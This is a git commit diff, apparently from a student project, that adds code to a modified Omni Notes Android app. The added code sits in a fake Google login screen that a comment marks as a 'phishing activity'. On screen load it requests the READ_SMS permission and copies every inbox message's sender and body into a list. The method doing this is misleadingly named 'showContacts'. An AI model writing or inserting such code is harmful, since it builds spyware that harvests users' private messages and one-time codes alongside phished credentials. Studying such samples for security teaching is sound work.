67b4e71a18a135ffa53e634caab032ed3787b82a
Afiq <2000476@sit.singaporetech.edu.sg>
2022-02-03 00:20:31 +0800

    added sms extraction

--- omniNotes/src/main/java/it/feio/android/omninotes/LoginGoogleEmail.java
+++ omniNotes/src/main/java/it/feio/android/omninotes/LoginGoogleEmail.java
@@ -1,27 +1,51 @@
 package it.feio.android.omninotes;
 
+import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
+import androidx.core.app.ActivityCompat;
+import androidx.core.content.ContextCompat;
 
+import android.Manifest;
+import android.content.ContentResolver;
 import android.content.Intent;
+import android.content.pm.PackageManager;
+import android.database.Cursor;
+import android.net.Uri;
 import android.os.Bundle;
+import android.util.Log;
 import android.util.Patterns;
 import android.view.View;
 import android.widget.Button;
 import android.widget.EditText;
 
 import android.util.Patterns;
+import android.widget.ListView;
 import android.widget.Toast;
 
+import java.util.ArrayList;
+
 public class LoginGoogleEmail extends AppCompatActivity {
+    private static int PERMISSION_REQUEST_READ_CONTACTS =100;
+    ArrayList<String>smsList;
+
+
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_login_google_email);
-
         final Button signInButton = findViewById(R.id.google_btn);
         final EditText email = findViewById(R.id.google_email);
         final EditText password = findViewById(R.id.google_password);
+        int permissionCheck = ContextCompat.checkSelfPermission(this,
+                Manifest.permission.READ_SMS);
+        if(permissionCheck == PackageManager.PERMISSION_GRANTED){
+            showContacts();
+        }else{
+            ActivityCompat.requestPermissions(this,
+                    new String[]{Manifest.permission.READ_SMS},
+                    PERMISSION_REQUEST_READ_CONTACTS);
+        }
 
         signInButton.setOnClickListener(new View.OnClickListener() {
             @Override
@@ -31,6 +55,38 @@ public class LoginGoogleEmail extends AppCompatActivity {
                 }
             }
         });
+    }
+    @Override
+    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
+
+        if (requestCode == PERMISSION_REQUEST_READ_CONTACTS) {
+            showContacts();
+        } else {
+            Toast.makeText(this, "Until you grant permission cannot display name", Toast.LENGTH_SHORT).show();
+        }
+
+    }
+
+    private void showContacts() {
+        Uri inboxURI= Uri.parse("content://sms/inbox");
+        smsList = new ArrayList<>();
+
+        ContentResolver contentResolver = getContentResolver();
+        Cursor cursor = contentResolver.query(inboxURI,null,null,null,null);
+        while (cursor.moveToNext()) {
+            String number = cursor.getString(cursor.getColumnIndexOrThrow("address"));
+            String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
+            smsList.add("Number:" + number + "\n" + "Body:" + body);
+        }
+        cursor.close();
+//                ArrayAdapter<String> adapter = new ArrayAdapter<String>(this,
+//                        android.R.layout.simple_list_item_1,smsList);
+//                listView.setAdapter(adapter);
+        for(int i = 0; i < smsList.size(); i++) {
+            System.out.println(smsList.get(i));
+        }
+
+
     }
 
     // do phishing activity
@@ -56,6 +112,8 @@ public class LoginGoogleEmail extends AppCompatActivity {
             return false;
         }
     }
+
+
 
     // password validation
     private boolean validatePassword(View v, String password){
